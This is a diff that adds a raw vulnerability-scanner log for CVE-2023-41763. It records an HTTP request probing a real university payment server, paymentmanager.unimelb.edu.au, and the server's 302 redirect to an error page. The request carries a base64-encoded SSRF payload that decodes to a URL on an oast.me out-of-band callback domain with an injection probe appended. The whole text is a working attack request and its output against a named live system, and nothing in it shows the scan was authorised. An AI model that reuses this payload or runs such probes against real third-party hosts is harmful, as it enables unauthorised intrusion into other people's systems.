@@ -1,0 +1,26 @@
+[CVE-2023-41763] Dumped HTTP request for https://paymentmanager.unimelb.edu.au/lwa/Webpages/LwaClient.aspx?meeturl=aHR0cDovL2QyOW4zcGF1czhuMGdoaHVydmpnM2NvbndrY2lhcDRtNy5vYXN0Lm1lLz9pZD1YYWwlMjV7MTMzNyoxMzM3fSMueHgvLw==
+
+
+GET /lwa/Webpages/LwaClient.aspx?meeturl=aHR0cDovL2QyOW4zcGF1czhuMGdoaHVydmpnM2NvbndrY2lhcDRtNy5vYXN0Lm1lLz9pZD1YYWwlMjV7MTMzNyoxMzM3fSMueHgvLw== HTTP/1.1
+Host: paymentmanager.unimelb.edu.au
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
+Connection: close
+Accept-Encoding: gzip
+
+
+[CVE-2023-41763] Dumped HTTP response https://paymentmanager.unimelb.edu.au/lwa/Webpages/LwaClient.aspx?meeturl=aHR0cDovL2QyOW4zcGF1czhuMGdoaHVydmpnM2NvbndrY2lhcDRtNy5vYXN0Lm1lLz9pZD1YYWwlMjV7MTMzNyoxMzM3fSMueHgvLw==
+
+HTTP/1.1 302 Found
+Connection: close
+Content-Length: 170
+Content-Type: text/html; charset=utf-8
+Date: Wed, 06 Aug 2025 15:18:06 GMT
+Location: /error.htm?aspxerrorpath=/lwa/Webpages/LwaClient.aspx
+Strict-Transport-Security: max-age=2592000
+X-Content-Type-Options: nosniff
+X-Frame-Options: SAMEORIGIN
+
+<html><head><title>Object moved</title></head><body>
+<h2>Object moved to <a href="/error.htm?aspxerrorpath=/lwa/Webpages/LwaClient.aspx">here</a>.</h2>
+</body></html>
+
